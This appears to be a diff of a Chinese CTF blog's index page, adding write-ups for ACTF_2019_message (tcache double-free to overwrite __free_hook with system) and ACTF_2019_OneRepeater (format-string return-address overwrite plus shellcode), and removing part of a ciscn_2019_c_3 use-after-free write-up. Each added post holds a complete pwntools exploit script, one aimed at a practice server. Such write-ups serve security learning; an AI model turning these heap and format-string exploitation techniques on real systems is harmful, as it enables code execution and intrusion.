+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYQSJ.png" alt="image-20240305201734649"></p>
+<h5 id="add的大小是0x80，保证了满的时侯的那个bin放在unsorted-bin，最后两个倒序释放，防止和top-chunk合并"><a href="#add的大小是0x80，保证了满的时侯的那个bin放在unsorted-bin，最后两个倒序释放，防止和top-chunk合并" class="headerlink" title="add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并"></a>add的大小是0x80，保证了满的时侯的那个bin放在unsorted bin，最后两个倒序释放，防止和top chunk合并</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+
+<p>堆7指针是main_arena+96</p>
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYJC9.png" alt="image-20240305202521878"></p>
+<p>我试了这种方法也可以show出来，不过edit的时候不能sendline，不然会覆盖掉一个字节，导致show的地址出错</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x60204c</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里因为用sendline所以出错了</p>
+<p><img src="https://i0.imgs.ovh/2024/03/04/O875W.png" alt="image-20240305203854218"></p>
+<p>或者用师傅的做法，不过我的更简单</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;aaaaaaa&#x27;</span>) <span class="comment">#堆8，会在unsorted bin里拿</span></span><br><span class="line">show(<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/05/QAzk0.png" alt="image-20240306185549924"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&#x27;The message: aaaaaaa&#x27;</span>)</span><br><span class="line">main_arena=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">224</span> <span class="comment">#这里减0x80再减96</span></span><br><span class="line"><span class="comment">#libc2.23和2.27都是__malloc_hook=main_arena-0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">base=main_arena-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x60204c</span>)+p64(<span class="number">0x80</span>)+p64(binsh)+p64(<span class="number">0x80</span>)+p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/05/QA4wm.png" alt="image-20240306190111092"></p>
+<p>最后有个地方就是free(1)会报错，得分开或者手动</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=remote(&quot;node5.buuoj.cn&quot;,29647)</span></span><br><span class="line">r=process(<span class="string">&quot;./ACTF_2019_message&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ACTF_2019_message&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">nu</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(nu))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;length of message:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input the message:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;you want to delete:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;you want to edit:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;edit the message:\n&#x27;</span>, content )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;want to display:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x200</span>,p64(<span class="number">0x60204c</span>))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x60204c</span>)+p64(<span class="number">0</span>)*<span class="number">20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,payload) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>) </span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;The message: aaaaaaa&#x27;</span>)</span><br><span class="line">main_arena=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">224</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">base=main_arena-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=base+ <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line">payload=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x60204c</span>)+p64(<span class="number">0x80</span>)+p64(binsh)+p64(<span class="number">0x80</span>)+p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;you want to delete:\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># 有时候得手动free(1),不然打不通，很离谱</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/03/05/ACTF-2019-message/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ACTF-2019-OneRepeater" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/03/02/ACTF-2019-OneRepeater/" target="_blank">ACTF_2019_OneRepeater</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/03/02/ACTF-2019-OneRepeater/" class="archive-article-date">
+        <time datetime="2024-03-02T08:13:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-02</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p><img src="https://i0.imgs.ovh/2024/03/01/78XMV.png" alt="image-20240302161950112"></p>
+<h5 id="有可读可写可执行段，是道格式化字符串题，用shellcode做"><a href="#有可读可写可执行段，是道格式化字符串题，用shellcode做" class="headerlink" title="有可读可写可执行段，是道格式化字符串题，用shellcode做"></a>有可读可写可执行段，是道格式化字符串题，用shellcode做</h5><p><img src="https://i0.imgs.ovh/2024/03/01/78V9I.png" alt="image-20240302162059697"></p>
+<p>1输入，会打印变量的栈地址，2格式化，可多次格式化，返回地址得在原来的基础上加0x10，因为这里leave以后并没有立即ret,而是lea     esp, [ecx-4]，调试发现时是add esp, 0x10，所以ret_addr&#x3D;0x408+0x10+4</p>
+<p><img src="https://i0.imgs.ovh/2024/03/01/78xet.png" alt="image-20240302165416987"></p>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29221</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./ACTF_2019_OneRepeater&quot;)</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>).strip(), <span class="number">16</span>)</span><br><span class="line">ret_addr=addr+<span class="number">0x418</span>+<span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload=p32(ret_addr)+b&#x27;%&#x27;+str(addr%65536-4).encode()+b&#x27;c&#x27;+b&#x27;%16$hn&#x27;</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.sendlineafter(&#x27;3) Exit&#x27;,&#x27;2&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.sendlineafter(&#x27;3) Exit&#x27;,&#x27;1&#x27;)</span></span><br><span class="line"><span class="string">payload=p32(ret_addr+2)+b&#x27;%&#x27;+str(addr//65536-4).encode()+b&#x27;c&#x27;+b&#x27;%16$hn&#x27;</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=p32(ret_addr)+p32(ret_addr+<span class="number">2</span>)+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(addr%<span class="number">65536</span>-<span class="number">8</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%16$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(addr//<span class="number">65536</span>-addr%<span class="number">65536</span>).encode()+<span class="string">b&#x27;c%17$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;3) Exit&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;3) Exit&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;3) Exit&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/03/02/ACTF-2019-OneRepeater/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-checkin" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -694,439 +1060,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2023/12/03/metasequoia-2020-samsara/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ciscn-2019-c-3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2023/11/27/ciscn-2019-c-3/" target="_blank">ciscn_2019_c_3</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2023/11/27/ciscn-2019-c-3/" class="archive-article-date">
-        <time datetime="2023-11-27T13:21:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-27</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p><img src="https://i.imgs.ovh/2023/11/27/pnlWA.png" alt="image-20231127212242738"></p>
-<h5 id="开启了全局偏移"><a href="#开启了全局偏移" class="headerlink" title="开启了全局偏移"></a>开启了全局偏移</h5><h5 id="add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数"><a href="#add函数，只允许申请固定的几个大小的堆，在堆地址-16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址-8的地址会加上随机数" class="headerlink" title="add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数"></a>add函数，只允许申请固定的几个大小的堆，在堆地址+16的地方写入内容，所以改不了fd和bk地址，堆地址开始写上0，堆地址+8的地址会加上随机数</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnne5.png" alt="image-20231127212332956"></p>
-<h5 id="show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址"><a href="#show函数，会把堆地址上的几个数分别打印出来，可以打印出main-arena-96的地址" class="headerlink" title="show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址"></a>show函数，会把堆地址上的几个数分别打印出来，可以打印出main_arena+96的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnhGT.png" alt="image-20231127213053713"></p>
-<h5 id="delete函数，存在很明显的UAF漏洞"><a href="#delete函数，存在很明显的UAF漏洞" class="headerlink" title="delete函数，存在很明显的UAF漏洞"></a>delete函数，存在很明显的UAF漏洞</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnb8d.png" alt="image-20231127213159824"></p>
-<h5 id="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"><a href="#还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针" class="headerlink" title="还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针"></a>还有个后面函数，可以改堆fd位置的东西，每次能使其加一，后面能改其bin指针</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnSAK.png" alt="image-20231127213350417"></p>
-<h5 id="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆"><a href="#先malloc大小为0x100的堆，然后释放8次，然后bin才会有main-arena-96-且得先malloc大小是0x100大小的堆" class="headerlink" title="先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆"></a>先malloc大小为0x100的堆，然后释放8次，然后bin才会有main_arena+96,且得先malloc大小是0x100大小的堆</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>) <span class="comment">#1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/11/27/pnJD3.png" alt="image-20231127215520780"></p>
-<h5 id="然后show的话能接收到其地址"><a href="#然后show的话能接收到其地址" class="headerlink" title="然后show的话能接收到其地址"></a>然后show的话能接收到其地址</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;attack_times: &quot;</span>)</span><br><span class="line"><span class="comment">#arena = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line">arena_96=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook=arena_96-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">gadget=base+one_gadget</span><br></pre></td></tr></table></figure>
-
-<h5 id="再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook"><a href="#再申请一个堆，这时候会在堆2开始-由于glibc-2-27的特性，会在开始的上方申请堆，这里不太明白为什么要用free-hook-0x10的地址，而不是free-hook" class="headerlink" title="再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook"></a>再申请一个堆，这时候会在堆2开始,由于glibc 2.27的特性，会在开始的上方申请堆，这里不太明白为什么要用free_hook-0x10的地址，而不是free_hook</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(free_hook-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment">#2</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgs.ovh/2023/11/27/pnGZ0.png" alt="image-20231127221735133"></p>
-<h5 id="double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址"><a href="#double-free然后用backdoor函数20次，fd-0x20-将bin指针指向0x0000562a77ab5280的地址" class="headerlink" title="double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址"></a>double free然后用backdoor函数20次，fd+0x20,将bin指针指向0x0000562a77ab5280的地址</h5><p><img src="https://i.imgs.ovh/2023/11/27/pnNKC.png" alt="image-20231127221921315"></p>
-<p><img src="https://i.imgs.ovh/2023/11/27/pnajt.png" alt="image-20231127222235671"></p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
